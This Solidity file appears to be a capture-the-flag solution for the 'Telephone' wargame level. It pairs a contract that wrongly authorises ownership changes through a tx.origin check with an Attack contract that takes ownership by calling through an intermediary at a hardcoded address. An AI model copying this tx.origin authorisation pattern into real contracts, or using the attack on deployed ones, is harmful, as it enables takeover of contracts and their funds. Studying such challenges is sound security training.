// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack {
// change the address
    Telephone t = Telephone(0x10381202d7E5B535763A61Ca6DA8700843f41e8F);
    function attack(address a) public {
        t.changeOwner(a);
    }
}
